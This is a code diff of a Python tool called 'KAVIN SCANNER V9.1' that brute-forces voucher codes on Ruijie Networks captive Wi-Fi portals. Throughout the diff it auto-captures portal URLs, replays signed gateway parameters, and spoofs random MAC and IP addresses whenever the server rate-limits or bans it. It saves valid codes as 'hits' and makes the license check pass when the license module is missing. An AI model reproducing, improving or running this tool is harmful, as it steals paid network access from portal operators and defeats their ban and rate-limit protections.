@@ -21,24 +21,22 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 8
+CONCURRENCY_LIMIT = 6
 TIMEOUT = 12
-SESSION_TTL = 25
-SESSION_REUSE_MAX = 30
+SESSION_TTL = 90
+SESSION_REUSE_MAX = 60
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = "/api/auth/wifidog"
 RUIJIE_VOUCHER = "/api/auth/voucher/?lang=en_US"
 
-APP_NAME = "KAVIN SCANNER V9"
+APP_NAME = "KAVIN SCANNER V9.1"
 APP_TAG  = "@khant7997"
 
 console = Console()
 tried_codes = set()
 code_lock = threading.Lock()
 LICENSE_INFO = {"status": "Unverified"}
-
-MANUAL_PORTAL = {"url": None}
 
 _REAL_OUIS = [
     "a4:50:46", "3c:cd:5d", "f4:8e:38", "b0:be:76", "8c:3b:ad",
@@ -71,20 +69,17 @@ def generate_random_ip():
         return "192.168.1.50"
 
 
-def get_real_mac_and_ip():
-    ip = "127.0.0.1"
-    mac = "00:00:00:00:00:00"
+def get_gateway_ip():
     try:
-        mac_raw = uuid.getnode()
-        mac = ':'.join(['{:02x}'.format((mac_raw >> elements) & 0xff)
-                        for elements in range(0, 2*6, 8)][::-1])
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
         s.close()
+        p = ip.split(".")
+        p[-1] = "1"
+        return ".".join(p)
     except Exception:
-        pass
-    return mac, ip
+        return "192.168.55.1"
 
 
 def clear_screen():
@@ -130,22 +125,9 @@ def epoch_ms_to_plan(ms, flow_bytes=0):
         return "N/A"
 
 
-def get_gateway_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        p = ip.split(".")
-        p[-1] = "1"
-        return ".".join(p)
-    except Exception:
-        return "192.168.55.1"
-
-
 def check_license():
     if not HAS_LICENSE_MODULE:
-        return False, "license.py မရှိ"
+        return True, "No license module — skip"
     try:
         r = _license.check_approval()
         if isinstance(r, tuple):
@@ -157,11 +139,23 @@ def check_license():
 
 def activate_license(k):
     if not HAS_LICENSE_MODULE:
-        return False, "license.py မရှိ"
+        return True, "No license module"
     try:
         return _license.activate(k)
     except Exception as e:
         return False, str(e)
+
+
+def _extract_portal_from_url(u):
+    if not u:
+        return None
+    try:
+        lo = u.lower()
+        if "ruijienetworks" in lo and ("wifidog" in lo or "wifidogauth" in lo):
+            return u
+    except Exception:
+        pass
+    return None
 
 
 def detect_and_capture():
@@ -173,6 +167,34 @@ def detect_and_capture():
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     })
 
+    gateways = [get_gateway_ip(), "192.168.55.1", "192.168.7.1",
+                "192.168.1.1", "192.168.0.1", "192.168.100.1",
+                "192.168.110.1", "192.168.233.1"]
+    for gw in dict.fromkeys(gateways):
+        for path in ("/", "/wifidog?stage=portal"):
+            try:
+                r = s.get(f"http://{gw}{path}", timeout=4, allow_redirects=False, verify=False)
+                loc = r.headers.get("Location", "") or ""
+                found = _extract_portal_from_url(loc)
+                if found:
+                    console.print("[green][+] Auto-captured portal via gateway redirect[/green]")
+                    return found
+            except Exception:
+                pass
+            try:
+                r2 = s.get(f"http://{gw}{path}", timeout=4, allow_redirects=True, verify=False)
+                if _extract_portal_from_url(r2.url):
+                    console.print("[green][+] Auto-captured portal via gateway final[/green]")
+                    return r2.url
+                for h in r2.history:
+                    hl = h.headers.get("Location", "") or ""
+                    found = _extract_portal_from_url(hl)
+                    if found:
+                        console.print("[green][+] Auto-captured portal via history[/green]")
+                        return found
+            except Exception:
+                pass
+
     probes = [
         "http://connectivitycheck.gstatic.com/generate_204",
         "http://detectportal.firefox.com/success.txt",
@@ -181,89 +203,33 @@ def detect_and_capture():
     ]
     for probe in probes:
         try:
-            r = s.get(probe, allow_redirects=False, timeout=6, verify=False)
-            loc = r.headers.get("Location", "")
-            if "ruijienetworks" in loc:
-                try:
-                    console.print("[green][+] Auto-captured portal (Location header)[/green]")
-                except Exception:
-                    pass
-                return loc
-            r2 = s.get(probe, allow_redirects=True, timeout=6, verify=False)
-            if "ruijienetworks" in r2.url:
-                try:
-                    console.print("[green][+] Auto-captured portal (final URL)[/green]")
-                except Exception:
-                    pass
+            r = s.get(probe, allow_redirects=False, timeout=5, verify=False)
+            found = _extract_portal_from_url(r.headers.get("Location", ""))
+            if found:
+                console.print("[green][+] Auto-captured portal via probe redirect[/green]")
+                return found
+            r2 = s.get(probe, allow_redirects=True, timeout=5, verify=False)
+            if _extract_portal_from_url(r2.url):
+                console.print("[green][+] Auto-captured portal via probe final[/green]")
                 return r2.url
             for h in r2.history:
-                hl = h.headers.get("Location", "")
-                if "ruijienetworks" in hl:
-                    try:
-                        console.print("[green][+] Auto-captured portal (history)[/green]")
-                    except Exception:
-                        pass
-                    return hl
+                found = _extract_portal_from_url(h.headers.get("Location", ""))
+                if found:
+                    console.print("[green][+] Auto-captured portal via probe history[/green]")
+                    return found
         except Exception:
             continue
 
-    gateways = [get_gateway_ip(), "192.168.55.1", "192.168.7.1",
-                "192.168.1.1", "192.168.0.1", "192.168.100.1"]
-    for gw in dict.fromkeys(gateways):
-        try:
-            r = s.get(f"http://{gw}/", timeout=4, allow_redirects=False, verify=False)
-            loc = r.headers.get("Location", "")
-            if "ruijienetworks" in loc:
-                try:
-                    console.print(f"[green][+] Auto-captured via gateway {gw} (Location)[/green]")
-                except Exception:
-                    pass
-                return loc
-            r2 = s.get(f"http://{gw}/", timeout=4, allow_redirects=True, verify=False)
-            if "ruijienetworks" in r2.url:
-                try:
-                    console.print(f"[green][+] Auto-captured via gateway {gw} (final)[/green]")
-                except Exception:
-                    pass
-                return r2.url
-            for h in r2.history:
-                hl = h.headers.get("Location", "")
-                if "ruijienetworks" in hl:
-                    try:
-                        console.print(f"[green][+] Auto-captured via gateway {gw} (history)[/green]")
-                    except Exception:
-                        pass
-                    return hl
-        except Exception:
-            pass
-
-    try:
-        console.print("[yellow][!] Auto-capture failed — manual paste လိုအပ်တယ်[/yellow]")
-    except Exception:
-        pass
+    console.print("[yellow][!] Auto-capture failed — manual paste လိုအပ်တယ်[/yellow]")
     return None
 
 
-def prompt_manual_url():
-    try:
-        console.print(Panel(
-            Align.center(Text(
-                "📋 Portal URL ကို copy ပြီး ဒီမှာ paste လုပ်ပါ\n"
-                "(Browser address bar က full URL — https://portal-mm-as.ruijienetworks.com/api/auth/wifidog?...)",
-                style="bold yellow")),
-            border_style="yellow", box=ROUNDED))
-        u = Prompt.ask("  [bright_cyan]➜ Portal URL[/bright_cyan]").strip()
-    except (KeyboardInterrupt, EOFError, Exception):
-        return None
-    if not u:
-        return None
-    if "ruijienetworks" not in u:
-        try:
-            console.print("[red]✗ ruijienetworks URL မဟုတ်ပါ[/red]")
-        except Exception:
-            pass
-        return None
-    return u
+GW_KEYS = (
+    "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
+    "ssid", "chap_id", "chap_challenge", "stage", "ustate",
+    "mac_req", "url", "gw_mac", "mac", "ip",
+    "timestamp", "sign", "v",
+)
 
 
 def build_gw_params(portal_url):
@@ -282,53 +248,48 @@ def build_gw_params(portal_url):
         "chap_challenge": r"\325\113\207\153\375\350\376\244\033\375\062\010\200\127\210\241",
         "url": "http://connectivitycheck.gstatic.com/generate_204",
         "v": "2",
+        "_path": RUIJIE_WIFIDOG,
     }
     if not portal_url:
         return p
 
     try:
-        q = parse_qs(urlparse(portal_url).query)
-        keys = (
-            "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
-            "ssid", "chap_id", "chap_challenge", "stage", "ustate",
-            "mac_req", "url", "gw_mac", "mac", "ip",
-            "timestamp", "sign", "v",
-        )
-        for k in keys:
+        pu = urlparse(portal_url)
+        if "wifidogauth" in pu.path.lower():
+            p["_path"] = "/auth/wifidogAuth/login/"
+        q = parse_qs(pu.query)
+        for k in GW_KEYS:
             if q.get(k):
                 p[k] = unquote(q[k][0])
 
-        if p.get("gw_address") and p["gw_address"] not in ("192.168.7.1", ""):
+        if p.get("sign") and p.get("timestamp"):
+            p["_locked"] = True
+        else:
+            p["_locked"] = False
+
+        base = RUIJIE_MM_BASE if "portal-mm" in portal_url else RUIJIE_BASE
+        p["_base"] = base
+        if p.get("gw_address"):
             parts = p["gw_address"].split(".")
             if len(parts) == 4 and not q.get("nasip"):
                 p["nasip"] = ".".join(parts[:3] + ["1"])
-
-        base = RUIJIE_MM_BASE if "portal-mm" in portal_url else RUIJIE_BASE
-        p["url"] = base
-        p["_base"] = base
     except Exception:
-        pass
+        p["_locked"] = False
     return p
 
 
 SESSION_PATTERNS = [
-    r'["\']?sessionId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{16,})["\']',
-    r'["\']?sessionId["\']?\s*[:=]\s*([A-Za-z0-9_\-=+/]{16,})',
-    r'["\']?session_id["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]{16,})',
-    r'/auth/wifidog\?[^"\'\s<>]*sessionId=([A-Za-z0-9_\-=+/]{16,})',
     r'[?&]sessionId=([A-Za-z0-9_\-=+/]{16,})',
+    r'["\']?sessionId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{16,})["\']',
+    r'/wifidog\?[^"\'\s<>]*sessionId=([A-Za-z0-9_\-=+/]{16,})',
     r'window\.location(?:\.href)?\s*=\s*["\'][^"\']*sessionId=([A-Za-z0-9_\-=+/]{16,})',
     r'sessionId=([A-Za-z0-9_\-=+/]{16,})',
     r'"session"\s*:\s*"([A-Za-z0-9_\-=+/]{16,})"',
 ]
-SIGN_PATTERNS = [
-    r'["\']?sign["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]+)',
-    r'[?&]sign=([A-Za-z0-9_\-=+/]+)',
-]
-TS_PATTERNS = [
-    r'["\']?timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})',
-    r'[?&]timestamp=(\d{10,13})',
-]
+SIGN_PATTERNS = [r'[?&]sign=([A-Za-z0-9_\-=+/]+)',
+                 r'["\']?sign["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]+)']
+TS_PATTERNS = [r'[?&]timestamp=(\d{10,13})',
+               r'["\']?timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})']
 
 
 def _find_first(patterns, text):
@@ -357,7 +318,6 @@ def _extract_from_url(u):
 
 def _extract_session(body, final_url, history, cookies_text=""):
     sid, sign, ts = _extract_from_url(final_url)
-
     if not sid and history:
         for h in reversed(history):
             loc = h if isinstance(h, str) else (h.headers.get("Location", "") or "")
@@ -365,7 +325,6 @@ def _extract_session(body, final_url, history, cookies_text=""):
             if s:
                 sid, sign, ts = s, sg or sign, t or ts
                 break
-
     if not sid:
         sid = _find_first(SESSION_PATTERNS, body)
     if not sid and cookies_text:
@@ -379,7 +338,6 @@ def _extract_session(body, final_url, history, cookies_text=""):
         sign = _find_first(SIGN_PATTERNS, body)
     if not ts:
         ts = _find_first(TS_PATTERNS, body)
-
     if not sid and body:
         try:
             m = re.search(r'URL\s*=\s*["\']?([^"\'\s>]*sessionId=[^"\'\s>]+)', body, re.I)
@@ -388,7 +346,6 @@ def _extract_session(body, final_url, history, cookies_text=""):
                 sid, sign, ts = s or sid, sg or sign, t or ts
         except Exception:
             pass
-
     return sid, sign, ts
 
 
@@ -405,38 +362,39 @@ def _sess_dict(sid, sign, ts, final_u, base, mac, ip):
     }
 
 
-async def fetch_real_session(session, gw_params, mac, ip, retries=4):
+async def fetch_real_session(session, gw_params, mac, ip, retries=5):
     errors = []
-    primary = (gw_params.get("url") or RUIJIE_BASE).rstrip("/")
-    base = RUIJIE_MM_BASE if "portal-mm" in primary else RUIJIE_BASE
-    base_full = base + RUIJIE_WIFIDOG
+    base = gw_params.get("_base") or RUIJIE_BASE
+    if "portal-mm" in base:
+        base = RUIJIE_MM_BASE
+    path = gw_params.get("_path") or RUIJIE_WIFIDOG
+    base_full = base + path
 
+    locked = bool(gw_params.get("_locked") and gw_params.get("sign")
+                  and gw_params.get("timestamp"))
     locked_sign = gw_params.get("sign")
     locked_ts = gw_params.get("timestamp")
-    locked_mac = gw_params.get("mac")
-    locked_ip = gw_params.get("ip")
-    locked = bool(locked_sign and locked_ts)
 
-    use_mac = (locked_mac or mac or generate_random_mac()).lower()
-    use_ip = locked_ip or ip or generate_random_ip()
+    use_mac = (gw_params.get("mac") or mac or generate_random_mac()).lower()
+    use_ip = gw_params.get("ip") or ip or generate_random_ip()
 
     for attempt in range(retries):
-        p = dict(gw_params)
-        p.pop("_base", None)
+        p = {k: v for k, v in gw_params.items()
+             if not k.startswith("_")}
         p["mac"] = use_mac
         p["ip"] = use_ip
         p["url"] = base
-        if "v" not in p:
-            p["v"] = "2"
+        p.setdefault("v", "2")
 
         if locked:
             p["sign"] = locked_sign
             p["timestamp"] = locked_ts
         else:
-            p.setdefault("timestamp", str(int(time.time())))
-            p.setdefault("sign", "")
+            p["timestamp"] = str(int(time.time()))
+            if not p.get("sign"):
+                p.pop("sign", None)
 
-        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in p.items())
+        qs = "&".join(f"{k}={quote(str(v), safe='\\')}" for k, v in p.items())
         url = f"{base_full}?{qs}"
 
         headers = {
@@ -450,7 +408,6 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
             "Referer": base + "/",
             "Connection": "close",
         }
-
         try:
             session.cookie_jar.clear()
         except Exception:
@@ -469,16 +426,11 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
                     if not locked:
                         use_mac = generate_random_mac().lower()
                         use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.5, 1.2))
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     errors.append(f"banned@{r1.status}")
                     continue
 
-                cookies_text = ""
-                try:
-                    cookies_text = r1.headers.get("Set-Cookie", "") or ""
-                except Exception:
-                    pass
-
+                cookies_text = r1.headers.get("Set-Cookie", "") or ""
                 sid, sign, ts = _extract_from_url(loc)
                 if not sid:
                     sid = _find_first(SESSION_PATTERNS, loc)
@@ -491,7 +443,6 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
                             sid = m.group(1)
                     except Exception:
                         pass
-
                 if sid and len(sid) >= 16:
                     final_u = urljoin(base_full, loc) if loc else base_full
                     return ("REAL", _sess_dict(sid, sign, ts, final_u,
@@ -499,7 +450,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
         except asyncio.TimeoutError:
             errors.append("timeout@r1")
         except asyncio.CancelledError:
-            return ("FAIL", "cancelled")
+            return ("FAIL", "retry-r1")
         except Exception as e:
             errors.append(f"err1:{type(e).__name__}")
 
@@ -510,7 +461,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
                     if not locked:
                         use_mac = generate_random_mac().lower()
                         use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.5, 1.2))
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     errors.append("429@body")
                     continue
 
@@ -521,7 +472,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
                     if not locked:
                         use_mac = generate_random_mac().lower()
                         use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.5, 1.2))
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     errors.append("banned@body")
                     continue
 
@@ -529,33 +480,29 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
                        [hh.headers.get("Location", "") for hh in r2.history]
                 cookies_text = ""
                 try:
-                    cookies_text = "; ".join(
-                        f"{c.key}={c.value}" for c in session.cookie_jar)
+                    cookies_text = "; ".join(f"{c.key}={c.value}" for c in session.cookie_jar)
                 except Exception:
                     pass
-
                 sid, sign, ts = _extract_session(body, str(r2.url), hist, cookies_text)
                 if sid and len(sid) >= 16:
                     return ("REAL", _sess_dict(sid, sign, ts, str(r2.url),
                                                base, use_mac, use_ip))
-
                 errors.append(f"nosid@HTTP{r2.status}")
                 if not locked:
                     use_mac = generate_random_mac().lower()
                     use_ip = generate_random_ip()
-
         except asyncio.TimeoutError:
             errors.append("timeout@r2")
             if not locked:
                 use_mac = generate_random_mac().lower()
                 use_ip = generate_random_ip()
         except asyncio.CancelledError:
-            return ("FAIL", "cancelled")
+            return ("FAIL", "retry-r2")
         except Exception as e:
             errors.append(f"err2:{type(e).__name__}")
 
         if attempt < retries - 1:
-            await asyncio.sleep(0.4)
+            await asyncio.sleep(0.3)
 
     return ("FAIL", "|".join(errors[-3:]) or "no-session")
 async def test_code(session, sess, code, mac, ip):
@@ -593,8 +540,7 @@ async def test_code(session, sess, code, mac, ip):
 
     try:
         async with session.post(url, json=payload, headers=headers,
-                                timeout=TIMEOUT, allow_redirects=False,
-                                ssl=False) as r:
+                                timeout=TIMEOUT, allow_redirects=False, ssl=False) as r:
             if r.status == 429:
                 return "__RATE_LIMITED__", "N/A"
 
@@ -693,20 +639,28 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
         for _ in range(4):
             stat_tbl.add_column(style="bold bright_white", justify="center")
         stat_style = "bold red" if any(x in str(status).upper() for x in (
-            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CHECK", "NO"
+            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CHECK", "NO", "CANCEL"
         )) else "bold green"
         stat_tbl.add_row(
-            f"Speed: {int(speed)} c/m",
-            f"Tested: {tested:,}",
-            Text(f"Status: {status}", style=stat_style),
-            f"UpTime: {elapsed}",
+            Text("🚀 speed", style="bold cyan"),
+            Text("📊 tested", style="bold cyan"),
+            Text("📡 Status", style="bold cyan"),
+            Text("⏱ Uptime", style="bold cyan"),
         )
-        stat_panel = Panel(stat_tbl, border_style="magenta", box=ROUNDED, height=3)
+        stat_tbl.add_row(
+            Text(f"⚡ {int(speed)}", style="bold bright_white"),
+            Text(f"🔢 {tested}", style="bold bright_white"),
+            Text(f"{status}", style=stat_style),
+            Text(f"🕒 {elapsed}", style="bold bright_white"),
+        )
+        stat_panel = Panel(stat_tbl, border_style="magenta", box=ROUNDED, height=4)
 
         cur_code_disp = cur_code if cur_code else "------"
         code_mode_panel = Panel(
-            Align.center(Text(f"Current ( {cur_code_disp} )  /  mode : {mode_str} ({scan_method.upper()})",
-                              style="bold yellow")),
+            Align.center(Text(
+                f"🎯 Current ( {cur_code_disp} )  /  🧩 mode : {mode_str} ({scan_method.upper()})",
+                style="bold yellow"
+            )),
             border_style="yellow", box=ROUNDED, height=3
         )
 
@@ -717,21 +671,21 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                     if sess_id and sess_id != "--------" else sess_stat)
 
         info_lines = Text()
-        info_lines.append("  Session  -> ", style="bold white")
+        info_lines.append("  🔐 Session  -> ", style="bold white")
         info_lines.append(f"{sess_txt}\n", style=sess_style)
-        info_lines.append("  Progress -> ", style="bold white")
+        info_lines.append("  📈 Progress -> ", style="bold white")
         info_lines.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="bold bright_cyan")
-        info_lines.append("  MAC/IP   -> ", style="bold white")
+        info_lines.append("  🖥 MAC/IP   -> ", style="bold white")
         info_lines.append(f"{mac}  /  {ip}", style="bold bright_white")
 
         info_panel = Panel(info_lines, border_style="blue", box=ROUNDED, height=5)
 
         vt = Table(show_header=True, header_style="bold bright_white", expand=True,
                    box=ROUNDED, border_style="green")
-        vt.add_column("No.", style="bold cyan", justify="center", width=6)
-        vt.add_column("VALID Code", style="bold bright_green", justify="center")
-        vt.add_column("Plan (expireTime)", style="bold green", justify="center")
-        vt.add_column("Timestamp", style="bold yellow", justify="center")
+        vt.add_column("🔢 No.", style="bold cyan", justify="center", width=7)
+        vt.add_column("🎟 VALID Code", style="bold bright_green", justify="center")
+        vt.add_column("⏳ Plan (expireTime)", style="bold green", justify="center")
+        vt.add_column("🕒 Timestamp", style="bold yellow", justify="center")
 
         recent_hits = list(hits)[-5:]
         if recent_hits:
@@ -739,7 +693,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
             for idx, h in enumerate(recent_hits, start=start_no):
                 vt.add_row(
                     str(idx),
-                    str(h.get("code", "")),
+                    f"🔑 {h.get('code', '')}",
                     str(h.get("plan", "N/A")),
                     str(h.get("time", "")),
                 )
@@ -771,7 +725,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
              "sess_stat": "NONE", "sess_id": "--------"}
     state_lock = threading.Lock()
 
-    locked = bool(gw_params.get("sign") and gw_params.get("timestamp"))
+    locked = bool(gw_params.get("_locked"))
     mac = gw_params.get("mac") or generate_random_mac()
     ip = gw_params.get("ip") or generate_random_ip()
 
@@ -798,7 +752,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 
     async def _fetch_one():
         try:
-            return await fetch_real_session(session, gw_params, mac, ip, retries=4)
+            return await fetch_real_session(session, gw_params, mac, ip, retries=5)
         except asyncio.CancelledError:
             return ("FAIL", "cancelled")
         except Exception as e:
@@ -815,16 +769,19 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
         async with sess_lock:
             if spare_task is not None:
                 if not spare_task.done():
+                    set_state(status="Fetching session…", sess_stat="FETCH")
                     try:
-                        tag, payload = await asyncio.wait_for(spare_task, timeout=8)
+                        await asyncio.shield(spare_task)
                     except Exception:
-                        tag, payload = ("FAIL", "spare-timeout")
-                else:
+                        pass
+                if spare_task.done():
                     try:
                         tag, payload = spare_task.result()
                     except Exception:
                         tag, payload = ("FAIL", "spare-error")
-                spare_task = None
+                    spare_task = None
+                else:
+                    tag, payload = ("FAIL", "spare-not-ready")
             else:
                 set_state(status="Fetching session…", sess_stat="FETCH")
                 tag, payload = await _fetch_one()
@@ -892,7 +849,12 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             pass
         timer = asyncio.create_task(timer_task())
 
-        spare_task = asyncio.create_task(_fetch_one())
+        try:
+            ok = await session_health()
+            while not ok:
+                ok = await session_health()
+        except Exception:
+            pass
 
         try:
             while True:
@@ -933,22 +895,20 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     results = []
 
                 refresh_needed = False
+                hit_flag = False
                 for idx, r in enumerate(results):
+                    with state_lock:
+                        state["tested"] += 1
+                        if idx < len(batch):
+                            state["cur_code"] = batch[idx]
+                    main_sess_used += 1
+
                     if isinstance(r, Exception):
-                        with state_lock:
-                            state["tested"] += 1
                         continue
                     if not (isinstance(r, tuple) and len(r) == 2):
-                        with state_lock:
-                            state["tested"] += 1
                         continue
 
                     res, plan = r
-                    with state_lock:
-                        state["tested"] += 1
-                        state["cur_code"] = batch[idx] if idx < len(batch) else ""
-                    main_sess_used += 1
-
                     if res == "__SESSION_EXPIRED__":
                         refresh_needed = True
                         set_state(sess_stat="EXPIRED", status="Session expired → rotate")
@@ -974,6 +934,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         except Exception:
                             pass
                         set_state(sess_stat="HIT")
+                        hit_flag = True
 
                 age = time.time() - main_sess_time
                 if (main_sess_used >= SESSION_REUSE_MAX or age >= SESSION_TTL) and not refresh_needed:
@@ -1006,6 +967,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         if spare_task is None:
                             spare_task = asyncio.create_task(_fetch_one())
 
+                if not refresh_needed and not hit_flag:
+                    set_state(status="Active")
+
                 await asyncio.sleep(0.005)
 
         except (KeyboardInterrupt, asyncio.CancelledError):
@@ -1037,7 +1001,6 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                 border_style="green", box=ROUNDED))
         except Exception:
             pass
-
 
 def show_banner():
     clear_screen()
@@ -1104,6 +1067,28 @@ def ask_scan():
             return {"1": "random", "2": "sequential"}[c]
 
 
+def prompt_manual_url():
+    try:
+        console.print(Panel(
+            Align.center(Text(
+                "📋 Portal URL ကို copy ပြီး ဒီမှာ paste လုပ်ပါ\n"
+                "(Browser address bar က full URL — /api/auth/wifidog?... သို့ /auth/wifidogAuth/login/?...)",
+                style="bold yellow")),
+            border_style="yellow", box=ROUNDED))
+        u = Prompt.ask("  [bright_cyan]➜ Portal URL[/bright_cyan]").strip()
+    except (KeyboardInterrupt, EOFError, Exception):
+        return None
+    if not u:
+        return None
+    if "ruijienetworks" not in u:
+        try:
+            console.print("[red]✗ ruijienetworks URL မဟုတ်ပါ[/red]")
+        except Exception:
+            pass
+        return None
+    return u
+
+
 def run():
     global LICENSE_INFO
     show_banner()
@@ -1117,18 +1102,10 @@ def run():
                                 border_style="yellow"))
             k = Prompt.ask("  ➜ Key").strip()
         except (KeyboardInterrupt, EOFError):
-            try:
-                console.print("[bold red]Cancelled.[/bold red]")
-            except Exception:
-                pass
             sys.exit(0)
         except Exception:
             sys.exit(0)
         if k.lower() in ("q", "quit", "exit"):
-            try:
-                console.print("[bold red]Cancelled.[/bold red]")
-            except Exception:
-                pass
             sys.exit(0)
         if not k:
             continue
@@ -1139,37 +1116,32 @@ def run():
                                 border_style="green" if ok2 else "red"))
         except Exception:
             pass
-        time.sleep(2)
+        time.sleep(1.5)
         ok, msg = check_license()
     LICENSE_INFO["status"] = msg
 
     portal_url = detect_and_capture()
+
     if not portal_url:
         portal_url = prompt_manual_url()
         if not portal_url:
             try:
-                console.print("[red]Portal URL မရ — exit[/red]")
+                console.print("[yellow]⚠ URL မရ — default gateway params နဲ့ဆက်မယ်[/yellow]")
             except Exception:
                 pass
-            return
-    if "ruijienetworks" not in portal_url:
-        try:
-            console.print("[red]✗ URL မှားနေတယ် — ruijienetworks portal URL လိုတယ်[/red]")
-        except Exception:
-            pass
-        return
 
     gw_params = build_gw_params(portal_url)
 
     try:
-        console.print(f"[dim]  • base      : {gw_params.get('url')}[/dim]")
+        console.print(f"[dim]  • base      : {gw_params.get('_base') or gw_params.get('url')}[/dim]")
+        console.print(f"[dim]  • path      : {gw_params.get('_path')}[/dim]")
         console.print(f"[dim]  • mac       : {gw_params.get('mac') or 'random (auto-rotate)'}[/dim]")
         console.print(f"[dim]  • ip        : {gw_params.get('ip') or 'random (auto-rotate)'}[/dim]")
         console.print(f"[dim]  • sign      : {'✓ LOCKED' if gw_params.get('sign') else '✗'}[/dim]")
         console.print(f"[dim]  • timestamp : {gw_params.get('timestamp', '✗')}[/dim]")
         console.print(f"[dim]  • v         : {gw_params.get('v', '2')}[/dim]")
-        if gw_params.get("sign") and gw_params.get("mac"):
-            console.print("[green]  ✓ sign+mac+ip LOCKED — real session ရဖို့ replay လုပ်မယ်[/green]")
+        if gw_params.get("_locked"):
+            console.print("[green]  ✓ sign+timestamp LOCKED — replay mode active[/green]")
     except Exception:
         pass
     time.sleep(1.5)
@@ -1189,8 +1161,12 @@ def run():
             asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
         except KeyboardInterrupt:
             pass
-        except Exception:
-            time.sleep(1)
+        except Exception as e:
+            try:
+                console.print(f"[bold red]Error: {e}[/bold red]")
+            except Exception:
+                pass
+            time.sleep(1.5)
 
 
 def main():
@@ -1215,3 +1191,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
